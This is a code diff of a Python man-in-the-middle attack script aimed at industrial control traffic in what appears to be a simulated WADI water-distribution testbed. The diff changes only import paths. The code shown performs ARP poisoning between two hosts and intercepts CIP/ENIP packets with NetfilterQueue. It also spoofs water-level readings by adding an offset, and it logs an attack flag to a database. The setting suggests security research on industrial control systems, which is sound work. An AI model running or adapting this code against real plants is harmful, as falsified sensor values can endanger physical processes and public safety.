@@ -1,4 +1,4 @@
-import cip
+import attack_repository.mitm_attacks.cip
 from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
@@ -9,8 +9,8 @@ import os
 import time
 import sqlite3
 
-import networker
-import convertions
+import attack_repository.mitm_attacks.networker
+import attack_repository.mitm_attacks.convertions
 
 # We connect to the database to store the attack flag
 conn = sqlite3.connect('../../ICS_topologies/wadi_topology/wadi_db.sqlite')
@@ -26,7 +26,7 @@ nfqueue = NetfilterQueue()
 
 def spoof(packet):
     raw_t = packet[Raw].load  # This is a string with the "RAW" part of the packet (CIP payload)
-    float_value = convertions.translate_load_to_float(raw_t)
+    float_value = attack_repository.mitm_attacks.convertions.translate_load_to_float(raw_t)
     spoofed_value = float_value + 0.6
     return spoofed_value
 
@@ -65,23 +65,23 @@ def capture(packet):
 
 
 def setdown():
-    networker.setdown_netfilterqueue(enip_port)
+    attack_repository.mitm_attacks.networker.setdown_netfilterqueue(enip_port)
     nfqueue.unbind()
     print("[*] Finished phase 1 of MiTM Attack")
     c.execute("UPDATE wadi SET value = 0 WHERE name = 'ATT_1'")
     conn.commit()
 
 def setup():
-    networker.configure_routing('192.168.1.254', 'attacker-eth0')
-    networker.start_forwarding()
+    attack_repository.mitm_attacks.networker.configure_routing('192.168.1.254', 'attacker-eth0')
+    attack_repository.mitm_attacks.networker.start_forwarding()
 
 def launch_mitm():
-    networker.setup_netfilterqueue(enip_port)
+    attack_repository.mitm_attacks.networker.setup_netfilterqueue(enip_port)
 
     sourceip = sys.argv[1]
     targetip = sys.argv[2]
 
-    networker.launch_arp_poison(sourceip, targetip)
+    attack_repository.mitm_attacks.networker.launch_arp_poison(sourceip, targetip)
     nfqueue.bind(0, capture)
     try:
         print("[*] Starting water level spoofing")
@@ -92,7 +92,7 @@ def launch_mitm():
     return 0
 
 def finish():
-    networker.setdown_netfilterqueue(enip_port)
+    attack_repository.mitm_attacks.networker.setdown_netfilterqueue(enip_port)
     sys.exit(0)
 
 if __name__ == '__main__':
